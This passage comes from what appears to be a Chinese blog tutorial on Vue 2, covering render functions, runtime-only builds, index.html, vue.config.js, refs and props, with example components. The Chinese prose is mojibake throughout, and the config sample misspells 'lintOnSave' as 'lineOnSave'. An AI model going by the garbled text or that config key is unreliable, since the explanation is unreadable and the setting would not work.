class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br><span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br><span class="hljs-attr">template</span>:<span class="hljs-string">`&lt;App&gt;&lt;/App&gt;`</span>,<br><span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">App</span>&#125;,<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>å¦‚æœè¿™æ ·å­å†™ï¼Œè¿è¡Œçš„è¯ä¼šå¼•å‘å¦‚ä¸‹çš„æŠ¥é”™</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124121513830.png" alt="image-20221124121513830"></p><p>æŠ¥é”™çš„æ„æ€æ˜¯ï¼Œæ˜¯åœ¨ä½¿ç”¨è¿è¡Œç‰ˆæœ¬çš„ vue ï¼Œæ²¡æœ‰æ¨¡æ¿è§£æå™¨ã€‚</p><p>ä»ä¸Šé¢çš„å°çŸ¥è¯†å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬å¼•å…¥çš„ vue ä¸æ˜¯å®Œæ•´ç‰ˆçš„ï¼Œæ˜¯æ®‹ç¼ºçš„ï¼ˆä¸ºäº†å‡å°vueçš„å¤§å°ï¼‰ã€‚æ‰€ä»¥æ®‹ç¼ºçš„vue.js åªæœ‰é€šè¿‡ renderå‡½æ•°æ‰èƒ½æŠŠé¡¹ç›®ç»™è·‘èµ·æ¥ã€‚</p><p>æ¥è§£æä¸€ä¸‹render</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// renderæœ€åŸå§‹å†™çš„æ–¹å¼</span><br><span class="hljs-comment">// renderæ˜¯ä¸ªå‡½æ•°ï¼Œè¿˜èƒ½æ¥æ”¶åˆ°å‚æ•°a</span><br><span class="hljs-comment">// è¿™ä¸ª createElement å¾ˆå…³é”®ï¼Œæ˜¯ä¸ªå›è°ƒå‡½æ•°</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params">createElement</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> createElement);<br>      <span class="hljs-comment">// è¿™ä¸ª createElement å›è°ƒå‡½æ•°èƒ½åˆ›å»ºå…ƒç´ </span><br>      <span class="hljs-comment">// å› ä¸ºæ®‹ç¼ºçš„vue ä¸èƒ½è§£æ templateï¼Œæ‰€ä»¥renderå°±æ¥å¸®å¿™è§£å†³è¿™ä¸ªé—®é¢˜</span><br>      <span class="hljs-comment">// createElement èƒ½åˆ›å»ºå…·ä½“çš„å…ƒç´ </span><br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;h1&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>)<br>  &#125;<br>&#125;).$mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>å› ä¸º render å‡½æ•°å†…å¹¶æ²¡æœ‰ç”¨åˆ° thisï¼Œæ‰€ä»¥å¯ä»¥ç®€å†™æˆç®­å¤´å‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-comment">// render: h =&gt; h(App),</span><br>  <span class="hljs-attr">render</span>: <span class="hljs-function">(<span class="hljs-params">createElement</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">createElement</span>(<span class="hljs-title class_">App</span>)<br>  &#125;<br>&#125;).$mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å†ç®€å†™ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">new Vue(&#123;<br>  // render: h =&gt; h(App),<br>  render: createElement =&gt; createElement(App)<br>&#125;).$mount(&#x27;#app&#x27;)<br></code></pre></td></tr></table></figure><p>æœ€åæŠŠ createElement æ¢æˆ h å°±å®Œäº‹äº†ã€‚</p><p>ç®—å•¦ç®—å•¦ï¼ŒæŠŠç®€å†™éƒ½æ•´ç†ä¸€éå§ï¼Œjsé‡Œçš„ç®€å†™ç¡®å®å¤šå“‡ã€‚</p><p>å¯¹è±¡å†…å†™æ–¹æ³•æœ€åŸå§‹çš„ï¼š</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work: function (salary) &#123;        return &#39;å·¥èµ„&#39; + salary;    &#125;&#125;</code></pre><p>ES6 ç®€åŒ–ç‰ˆï¼š</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work(salary) &#123;        return &#39;å·¥èµ„&#39; + salary;    &#125;&#125;</code></pre><p>ç®­å¤´å‡½æ•°ç®€åŒ–ç‰ˆ:</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work: (salary) =&gt; &#123;        return &#39;å·¥èµ„&#39; + salary;    &#125;&#125;</code></pre><p>ç®­å¤´å‡½æ•°å†ç®€åŒ–ï¼ˆæœ€ç»ˆç‰ˆï¼‰ï¼š</p><p>&#x2F;&#x2F; åªæœ‰ä¸€ä¸ªå‚æ•°å°±å¯ä»¥æŠŠåœ†æ‹¬å·å»äº†ï¼Œå‡½æ•°ä½“å†…éƒ¨åªæœ‰ä¸€ä¸ª return å°±å¯ä»¥æŠŠå¤§æ‹¬å·å»æ‰ï¼Œreturnå»æ‰</p><pre><code class="hljs">let obj = &#123;    name: &#39;aaa&#39;,    work: salary =&gt; &#39;å·¥èµ„&#39; + salary;&#125;</code></pre><p>è¿™æ ·å°±å¯ä»¥ç†è§£ render å‡½æ•°çš„ç®€å†™æ–¹å¼äº†ã€‚</p><p>è„šæ‰‹æ¶ä¸­çš„index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- é’ˆå¯¹IEæµè§ˆå™¨çš„ä¸€ä¸ªç‰¹æ®Šé…ç½®ï¼Œå«ä¹‰æ˜¯è®©IEæµè§ˆå™¨ä»¥æœ€é«˜çš„æ¸²æŸ“çº§åˆ«æ¸²æŸ“é¡µé¢ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å¼€å¯ç§»åŠ¨ç«¯çš„ç†æƒ³è§†å£ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- é…ç½®é¡µç­¾å›¾æ ‡ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å¼•å…¥ç¬¬ä¸‰æ–¹æ ·å¼ --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;%= BASE_URL %&gt;css/bootstrap.css&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- é…ç½®ç½‘é¡µæ ‡é¢˜ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç¡…è°·ç³»ç»Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å½“æµè§ˆå™¨ä¸æ”¯æŒjsæ—¶noscriptä¸­çš„å…ƒç´ å°±ä¼šè¢«æ¸²æŸ“ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span><br><span class="hljs-comment">&lt;!-- å®¹å™¨ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- built files will be auto injected --&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å…³äºä¸åŒç‰ˆæœ¬çš„å‡½æ•°"><a href="#å…³äºä¸åŒç‰ˆæœ¬çš„å‡½æ•°" class="headerlink" title="å…³äºä¸åŒç‰ˆæœ¬çš„å‡½æ•°"></a>å…³äºä¸åŒç‰ˆæœ¬çš„å‡½æ•°</h3><ol><li><p>vue.jsä¸vue.runtime.xxx.jsçš„åŒºåˆ« </p><ul><li><p>vue.js æ˜¯å®Œæ•´ç‰ˆçš„Vueï¼ŒåŒ…å«ï¼šæ ¸å¿ƒåŠŸèƒ½+æ¨¡æ¿è§£æå™¨</p></li><li><p>vue.runtime.xxx.js æ˜¯è¿è¡Œç‰ˆçš„Vueï¼ŒåªåŒ…å«æ ¸å¿ƒåŠŸèƒ½ï¼Œæ²¡æœ‰æ¨¡æ¿è§£æå™¨</p></li><li><p>esm å°±æ˜¯ ES6 module</p></li></ul></li><li><p>å› ä¸º vue.runtime.xxx.js æ²¡æœ‰æ¨¡æ¿è§£æå™¨ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨templateé…ç½®é¡¹ï¼Œéœ€è¦ä½¿ç”¨renderå‡½æ•°æ¥æ”¶åˆ°çš„createElementå‡½æ•°å»æŒ‡å®šå…·ä½“å†…å®¹</p></li></ol><h3 id="vue-config-js-é…ç½®æ–‡ä»¶"><a href="#vue-config-js-é…ç½®æ–‡ä»¶" class="headerlink" title="vue.config.js é…ç½®æ–‡ä»¶"></a>vue.config.js é…ç½®æ–‡ä»¶</h3><p>vue inspect &gt; output.jså¯ä»¥æŸ¥çœ‹åˆ°Vueè„šæ‰‹æ¶çš„é»˜è®¤é…ç½®</p><p>ä½¿ç”¨vue.config.jså¯ä»¥å¯¹è„šæ‰‹æ¶è¿›è¡Œä¸ªæ€§åŒ–å®šåˆ¶ï¼Œå’Œpackage.jsonåŒçº§ç›®å½•ï¼Œè¯¦è§ <a href="https://cli.vuejs.org/zh/config/#vue-config-js">é…ç½®å‚è€ƒ | Vue CLI</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html">module.exports = &#123;<br>  pages: &#123;<br>    index: &#123;<br>      entry: &#x27;src/index/main.js&#x27; // å…¥å£<br>    &#125;<br>  &#125;,<br>  lineOnSave: false// å…³é—­è¯­æ³•æ£€æŸ¥<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-vue-é›¶ç¢çš„ä¸€äº›çŸ¥è¯†"><a href="#2-2-vue-é›¶ç¢çš„ä¸€äº›çŸ¥è¯†" class="headerlink" title="2.2 vue é›¶ç¢çš„ä¸€äº›çŸ¥è¯†"></a>2.2 vue é›¶ç¢çš„ä¸€äº›çŸ¥è¯†</h2><h3 id="refå±æ€§"><a href="#refå±æ€§" class="headerlink" title="refå±æ€§"></a>refå±æ€§</h3><ul><li>è¢«ç”¨æ¥ç»™å…ƒç´ æˆ–å­ç»„ä»¶æ³¨å†Œå¼•ç”¨ä¿¡æ¯ï¼ˆidçš„æ›¿ä»£è€…ï¼‰</li><li>åº”ç”¨åœ¨htmlæ ‡ç­¾ä¸Šè·å–çš„æ˜¯çœŸå®DOMå…ƒç´ ï¼Œåº”ç”¨åœ¨ç»„ä»¶æ ‡ç­¾ä¸Šæ˜¯ç»„ä»¶å®ä¾‹å¯¹è±¡ï¼ˆvcï¼‰</li><li>ä½¿ç”¨æ–¹å¼ï¼š<ul><li>æ‰“æ ‡è¯†ï¼š<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code>æˆ– <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li><li>è·å–ï¼š<code>this.$refs.xxx</code></li></ul></li></ul><blockquote><p>å…·ä½“æ¡ˆä¾‹</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;msg&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;btn&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showDOM&quot;</span>&gt;</span>ç‚¹æˆ‘è¾“å‡ºä¸Šæ–¹çš„DOMå…ƒç´ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;sch&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-comment">//å¼•å…¥Schoolç»„ä»¶</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">School</span>&#125;,</span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">msg</span>:<span class="hljs-string">&#x27;æ¬¢è¿å­¦ä¹ Vueï¼&#x27;</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">showDOM</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">title</span>) <span class="hljs-comment">//çœŸå®DOMå…ƒç´ </span></span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">btn</span>) <span class="hljs-comment">//çœŸå®DOMå…ƒç´ </span></span><br><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">sch</span>) <span class="hljs-comment">//Schoolç»„ä»¶çš„å®ä¾‹å¯¹è±¡ï¼ˆvcï¼‰</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>â€‹    </p><h3 id="propsé…ç½®é¡¹"><a href="#propsé…ç½®é¡¹" class="headerlink" title="propsé…ç½®é¡¹"></a>propsé…ç½®é¡¹</h3><p>propsè®©ç»„ä»¶æ¥æ”¶å¤–éƒ¨ä¼ è¿‡æ¥çš„æ•°æ® </p><ol><li><p>ä¼ é€’æ•°æ®<code>&lt;Demo name=&quot;xxx&quot; :age=&quot;18&quot;/&gt;</code>è¿™é‡Œageå‰åŠ :&#x3D;&#x3D;ï¼Œé€šè¿‡v-bindä½¿å¾—é‡Œé¢çš„18æ˜¯æ•°å­—</p></li><li><p>æ¥æ”¶æ•°æ®</p><ul><li><p>ç¬¬ä¸€ç§æ–¹å¼ï¼ˆåªæ¥æ”¶ï¼‰props:[â€˜nameâ€™, â€˜ageâ€™] </p></li><li><p>ç¬¬äºŒç§æ–¹å¼ï¼ˆé™åˆ¶ç±»å‹ï¼‰props:{name:String, age:Number}</p></li><li><p>ç¬¬ä¸‰ç§æ–¹å¼ï¼ˆé™åˆ¶ç±»å‹ã€é™åˆ¶å¿…è¦æ€§ã€æŒ‡å®šé»˜è®¤å€¼ï¼‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">props: &#123;<br>    name: &#123;<br>        type: String, // ç±»å‹<br>        required: true,// å¿…è¦æ€§<br>        default: &#x27;cess&#x27;// é»˜è®¤å€¼<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><blockquote><p>å¤‡æ³¨ï¼špropsæ˜¯åªè¯»çš„ï¼ŒVueåº•å±‚ä¼šç›‘æµ‹ä½ å¯¹propsçš„ä¿®æ”¹ï¼Œå¦‚æœè¿›è¡Œäº†ä¿®æ”¹ï¼Œå°±ä¼šå‘å‡ºè­¦å‘Šï¼Œè‹¥ä¸šåŠ¡éœ€æ±‚ç¡®å®éœ€è¦ä¿®æ”¹ï¼Œé‚£ä¹ˆè¯·å¤åˆ¶propsçš„å†…å®¹åˆ°dataä¸­ä¸€ä»½ï¼Œç„¶åå»ä¿®æ”¹dataä¸­çš„æ•°æ®ã€‚</p></blockquote><p>ç¤ºä¾‹ä»£ç ï¼š</p><p>çˆ¶ç»„ä»¶ç»™å­ç»„ä»¶ä¼ æ•°æ®</p><p>App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Vue logo&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./assets/logo.png&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Student</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;haha&quot;</span> <span class="hljs-attr">:age</span>=<span class="hljs-string">&quot;this.age&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">School</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School.vue&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student.vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">  data () &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">age</span>: <span class="hljs-number">360</span>  </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;,</span><br><span class="language-javascript">  <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-title class_">School</span>,</span><br><span class="language-javascript">    <span class="hljs-title class_">Student</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-id">#app</span> &#123;</span><br><span class="language-css">  <span class="hljs-attribute">font-family</span>: Avenir, Helvetica, Arial, sans-serif;</span><br><span class="language-css">  -webkit-<span class="hljs-attribute">font-smoothing</span>: antialiased;</span><br><span class="language-css">  -moz-osx-<span class="hljs-attribute">font-smoothing</span>: grayscale;</span><br><span class="language-css">  <span class="hljs-attribute">text-align</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;</span><br><span class="language-css">  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">60px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>School.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åç§°ï¼š&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡å¹´é¾„ï¼š&#123;&#123; age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>å­¦æ ¡åœ°å€ï¼š&#123;&#123; address &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showName&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºå­¦æ ¡å<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;School&quot;</span>,</span><br><span class="language-javascript">  <span class="hljs-comment">// æœ€ç®€å•çš„å†™æ³•ï¼šprops: [&#x27;name&#x27;, &#x27;age&#x27;]</span></span><br><span class="language-javascript">  <span class="hljs-attr">props</span>: &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// å¿…é¡»è¦ä¼ çš„</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">age</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">    &#125;</span><br><span 